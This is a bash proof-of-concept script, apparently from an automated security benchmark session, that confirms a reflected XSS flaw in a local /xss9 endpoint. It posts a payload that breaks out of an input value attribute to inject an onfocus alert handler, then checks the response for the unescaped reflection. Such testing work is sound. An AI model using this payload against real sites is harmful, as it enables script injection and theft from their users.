#!/bin/bash
# POC: Demonstrates Reflected XSS vulnerability in /xss9 endpoint via input value attribute escape. The 'solution' parameter is not properly escaped, allowing injection of event handlers.
# Target: ./repo
# Created: 2025-11-07T19:15:25.724Z
# Session: benchmark-XBEN-064-24-mhp85ykb

# Reflected XSS via Input Value Attribute Escape - /xss9 endpoint
# This POC demonstrates how the 'solution' parameter can be exploited
# to break out of the HTML value attribute and inject arbitrary JavaScript

TARGET_URL="http://localhost:5000/xss9"
PAYLOAD="\" onfocus=\"alert(1)\" autofocus=\""

echo "[*] Testing Reflected XSS in /xss9 endpoint"
echo "[*] Target: $TARGET_URL"
echo "[*] Payload: $PAYLOAD"
echo ""

# Send the XSS payload
RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "solution=$PAYLOAD")

echo "[*] Response received:"
echo "$RESPONSE"
echo ""

# Check if the payload is reflected without escaping
if echo "$RESPONSE" | grep -q "onfocus=\"alert(1)\""; then
    echo "[+] SUCCESS: XSS payload reflected without proper escaping!"
    echo "[+] The onfocus event handler was successfully injected"
    echo "[+] Vulnerability confirmed: Input value attribute is not escaped"
    exit 0
else
    echo "[-] FAILED: Payload was not found in response or was escaped"
    exit 1
fi